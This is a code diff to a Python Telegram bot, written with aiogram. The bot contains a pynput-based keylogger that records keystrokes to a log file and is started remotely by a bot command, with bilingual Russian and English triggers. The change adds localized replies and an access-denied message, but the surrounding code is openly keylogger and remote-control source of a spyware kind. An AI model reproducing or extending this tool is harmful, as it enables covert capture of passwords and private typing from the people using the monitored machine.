@@ -21,6 +21,7 @@ from pynput import keyboard
 from pynput.keyboard import Key
 from aiogram.fsm.context import FSMContext
 from aiogram.filters import Command
+from lib.texts import TEXTS, user_languages
 
 from config import ALLOWED_USER_ID
 
@@ -33,10 +34,8 @@ def key_logger_handlers(dp):
         "йцукенгшщзхъфывапролджэячсмитьбюё"
     )
 
-
     def translate_layout(text: str) -> str:
         return text.translate(LAT_TO_RUS_MAP)
-
 
     class KeyLogger:
         def __init__(self, log_path: str):
@@ -79,18 +78,20 @@ def key_logger_handlers(dp):
             self.listener_thread = threading.Thread(target=self.listener.start, daemon=True)
             self.listener_thread.start()
 
-
     keylogger = KeyLogger(log_file_path)
 
-
-    @dp.message(F.text.casefold().startswith("key logger"))
+    @dp.message(F.text.casefold().startswith("key logger") | F.text.casefold().startswith("кейлоггер"))
     @dp.message(Command("key_logger"))
     async def start_getting_path(message: types.Message, state: FSMContext):
-        if message.from_user.id != ALLOWED_USER_ID:
+        user_id = message.from_user.id
+        lang = user_languages.get(user_id, 'ru')
+
+        if user_id != ALLOWED_USER_ID:
+            await message.answer(TEXTS[lang]['no_access'])
             return
 
         if not keylogger.listener_running or (keylogger.listener_thread and not keylogger.listener_thread.is_alive()):
             keylogger.start()
-            await message.answer("Кейлоггер запущен, root")
+            await message.answer(TEXTS[lang]['keylogger_started'])
         else:
-            await message.answer("Кейлоггер уже работает, root")
+            await message.answer(TEXTS[lang]['keylogger_already_running'])
